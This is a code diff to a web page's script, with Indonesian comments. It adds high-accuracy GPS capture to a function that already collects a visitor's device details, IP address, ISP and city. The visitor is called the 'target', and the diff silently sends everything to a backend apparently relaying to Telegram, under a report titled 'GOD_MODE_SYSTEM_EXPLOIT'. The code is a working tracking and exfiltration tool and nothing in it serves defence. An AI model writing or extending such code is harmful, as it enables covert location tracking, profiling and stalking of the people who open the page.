@@ -525,9 +525,11 @@
   async function kirimKeTelegram() {
     try {
         console.log("Mengumpulkan payload...");
+        
+        // 1. Ganti ke API Geolocation cadangan yang lebih stabil tanpa limit ketat
         let geoData = {};
         try {
-            const geoResponse = await fetch('https://ipapi.co');
+            const geoResponse = await fetch('https://ipwho.is');
             if (geoResponse.ok) geoData = await geoResponse.json();
         } catch (e) {}
 
@@ -549,9 +551,33 @@
             }
         } catch (e) {}
 
-        // Susun teks laporan langsung di frontend
+        // 2. FUNGSI UTAMA: Meminta izin lokasi GPS presisi tinggi langsung dari HP/Browser target
+        let gpsCoords = "Target Menolak Izin Lokasi GPS";
+        let mapsUrl = "Tidak Ada Data GPS";
+        
+        if (navigator.geolocation) {
+            // Kita bungkus ke Promise agar kode menunggu user menekan tombol 'Allow' atau 'Deny'
+            gpsCoords = await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        mapsUrl = `https://google.com{lat},${lon}`;
+                        resolve(`🛰️ GPS Aktif\n├─ Latitude: ${lat}\n├─ Longitude: ${lon}\n└─ Akurasi: ${Math.round(acc)} meter`);
+                    },
+                    (error) => {
+                        resolve(`❌ Akses GPS Ditolak (${error.message})`);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        // 3. Susun semua variabel ke dalam teks laporan tunggal
         const teksLaporan = `
 ☣️ *GOD_MODE_SYSTEM_EXPLOIT*
+
 📱 *HARDWARE*
 ├─ ⚡ *Baterai:* ${batteryInfo}
 ├─ 💾 *RAM:* ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Hidden/iOS'}
@@ -559,25 +585,30 @@
 ├─ 🎮 *GPU:* \`${gpuInfo}\`
 └─ 🎚️ *Layar:* ${window.screen.width}x${window.screen.height} px
 
-🌐 *NETWORK & GEO*
+📡 *GPS LOKASI ASLI (MINTA IZIN)*
+${gpsCoords}
+📍 *Link Google Maps Presisi:* ${mapsUrl}
+
+🌐 *JARINGAN CADANGAN (IPWHO.IS)*
 ├─ 🌐 *IP:* ${geoData.ip || 'Unknown'}
-├─ 🏢 *ISP:* ${geoData.org || 'Unknown'}
-├─ 🌍 *Kota:* ${geoData.city || 'Unknown'}, ${geoData.country_name || 'Unknown'}
-└─ 🗺️ *G-Maps:* \`https://google.com{geoData.latitude || 0},${geoData.longitude || 0}\`
+├─ 🏢 *ISP:* ${geoData.connection?.isp || 'Unknown'}
+├─ 🌍 *Kota:* ${geoData.city || 'Unknown'}, ${geoData.country || 'Unknown'}
+└─ 🗺️ *Koordinat IP:* ${geoData.latitude || 0}, ${geoData.longitude || 0}
         `.trim();
 
-        // Kirim string tunggal ke Vercel
+        // 4. Kirim teks laporan tunggal ke backend Vercel secara silent
         await fetch('/api/kirim.mjs', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ pesan: teksLaporan })
         });
 
-        console.log('Payload sent.');
+        console.log('Ultimate payload successfully sent.');
     } catch (error) {
         console.error('Failed:', error);
     }
-}        
+}
+ 
     </script>
 </body>
 </html>
